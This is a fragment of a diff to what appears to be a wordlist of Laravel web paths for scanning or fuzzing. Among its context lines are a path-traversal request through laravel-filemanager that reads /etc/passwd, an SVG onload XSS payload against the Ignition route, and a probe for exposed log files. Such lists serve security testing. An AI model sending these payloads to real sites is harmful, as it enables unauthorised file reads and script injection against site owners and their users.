@@ -23,3 +23,5 @@
 /laravel-filemanager/download?working_dir=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&type=&file=passwd
 /_ignition/scripts/--><svg%20onload=alert(document.domain)>
 /storage/logs/laravel.log
+{{paths}}
+/public/index.php
